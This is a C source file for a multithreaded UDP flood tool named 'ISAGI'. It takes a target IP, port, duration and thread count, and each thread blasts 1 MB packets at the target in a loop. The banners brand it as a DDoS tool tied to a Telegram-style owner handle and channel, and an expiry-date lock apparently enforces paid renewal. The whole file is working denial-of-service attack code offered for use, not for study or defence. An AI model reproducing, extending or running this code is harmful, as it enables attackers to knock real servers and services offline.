#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <net/if.h>
#include <libgen.h>

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define BUFFER_SIZE 1048576
#define EXPIRATION_YEAR 2030
#define EXPIRATION_MONTH 3
#define EXPIRATION_DAY 20

char *ip;
int port;
int duration;
char *padding_data;

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);
    if (difftime(mktime(&expiration_date), now) <= 0) {
        printf(RED "🔥 FILE CLOSED BY @SLAYER_OP7 🔥\n" RESET);
        exit(EXIT_FAILURE);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char *buffer = malloc(BUFFER_SIZE);
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    struct sched_param sched_params = { .sched_priority = sched_get_priority_max(SCHED_RR) };
    sched_setscheduler(0, SCHED_RR, &sched_params);
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        free(buffer);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);
    
    memset(buffer, 'X', BUFFER_SIZE);

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        printf(GREEN "⚡ ATTACK STARTED ON %s:%d FOR %d SECONDS ⚡\n" RESET, ip, port, duration);
    }
    printf(GREEN "🔥 ATTACK FINISHED ON %s:%d 🔥\n" RESET, ip, port);
    close(sock);
    free(buffer);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();
    
    char *binary_name = basename(argv[0]);  
    if (strcmp(binary_name, "ISAGI") != 0) {
        printf(RED "\n🔥 ERROR: BINARY NAME MUST BE 'ISAGI' 🔥\n" RESET);
        exit(EXIT_FAILURE);
    }
    
    if (argc != 5) {
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n");
        fprintf(stderr, CYAN "🚀           PAPA ISAGI             🚀\n");
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n" RESET);
        fprintf(stderr, "\n");
        fprintf(stderr, "┌────────────┬───────────────────────────────┐\n");
        fprintf(stderr, "│  papa ko   |   DM KARO :- @SLAYER_OP7       │\n");
        fprintf(stderr, "├────────────┼───────────────────────────────┤\n");
        fprintf(stderr, "│  IP        │  Target IP address            │\n");
        fprintf(stderr, "│  PORT      │  Target Port number           │\n");
        fprintf(stderr, "│  DURATION  │  Attack duration in seconds   │\n");
        fprintf(stderr, "│  THREADS   │  Number of concurrent threads │\n");
        fprintf(stderr, "└────────────┴───────────────────────────────┘\n");
        fprintf(stderr, "\n");
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n");
        fprintf(stderr, GREEN "⚡ AFTER EXPIRE DM @SLAYER_OP7 ⚡\n");
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n");
        fprintf(stderr, YELLOW "🔥 EXPIRES ON: %d-%02d-%02d 🔥\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n");
        fprintf(stderr, CYAN "🚀 OWNER: @SLAYER_OP7 🚀\n");
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n");
        fprintf(stderr, GREEN "🔥 JOIN CHANNEL @ddosgroupbyzodvik 🔥\n");
        fprintf(stderr, RED "🔥═══════════════════════════════════════════🔥\n" RESET);
        exit(EXIT_FAILURE);
    }
    
    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    padding_data = malloc(16 * 1024 * 1024);
    memset(padding_data, 0, 16 * 1024 * 1024);
    
    pthread_t *tid = malloc(sizeof(pthread_t) * threads);
    if (!tid) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }
    
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }
    
    free(tid);
    free(padding_data);
    return 0;
}
